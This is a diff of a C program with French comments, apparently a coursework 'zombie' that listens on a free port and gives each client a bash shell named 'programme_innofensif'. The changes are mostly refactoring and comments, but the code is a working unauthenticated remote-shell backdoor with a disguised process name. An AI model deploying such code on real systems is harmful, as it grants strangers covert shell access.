@@ -9,22 +9,42 @@
 #include <sys/wait.h>
 #include <stdio.h>
 #include <unistd.h>
-#define BUF_SIZE 1024
 #include "utils_v2.h"
 #include "messages.h"
 
+#define BUF_SIZE 1024
+
 int client_sock;
 
-void handle_sigint(int sig)
+#include "messages.h"
+#include "utils_v2.h"
+
+
+/** 
+ * 
+ * PRE :sig: Le signal reçu, doit être SIGINT (interruption de programme),
+ *  La variable globale "client_sock" doit être initialisée et correspondre à un socket client valide.
+ *
+ * POST : Envoie le message "FERMER_ZOMBIE" au client connecté.ferme la connexion avec le client.
+ */
+
+void sigint(int sig)
 {
-    char *shutdown_message = "ZOMBIE_SHUTDOWN\n";
+    char *shutdown_message = "FERMER_ZOMBIE\n";
     write(client_sock, shutdown_message, strlen(shutdown_message));
     close(client_sock);
     exit(0);
 
 }
 
-// obtenir un port dispo
+
+
+/**
+* PRE  : la plage de port acceptés.
+* POST : cherche un port ouvert dans la plage fournie. 
+* RES  : le numéro d'un port ouvert ou -1 si aucun port n'est disponible ou en cas d'erreur.
+*/
+
 int getPort(int minPort, int maxPort)
 {
     int sock;
@@ -45,6 +65,13 @@ int getPort(int minPort, int maxPort)
 
     return -1;
 }
+
+
+/**
+* PRE  : port, le port désiré.
+* POST : une nouvelle connection est créée. Celle-ci accepte toutes les adresses et écoute sur le port fourni en paramètre.
+* RES  : un fd d'un socket qui écoute sur le port passé en paramètre ou -1 en cas d'erreur.
+*/
 
 int createConnection(int port)
 {
@@ -75,10 +102,12 @@ int createConnection(int port)
     return sock;
 }
 
+
+
 int main()
 {
     struct sigaction sa;
-    sa.sa_handler = handle_sigint;
+    sa.sa_handler = sigint;
     sigemptyset(&sa.sa_mask);
     sigaction(SIGINT, &sa, NULL);
 
@@ -127,7 +156,6 @@ int main()
             dup2(client_sock, STDOUT_FILENO);
             dup2(client_sock, STDERR_FILENO);
 
-            //prctl(PR_SET_NAME, "Programme innofensif",0,0,0);
             execl("/bin/bash", "programme_innofensif", NULL);
             perror("execl");
             exit(1);
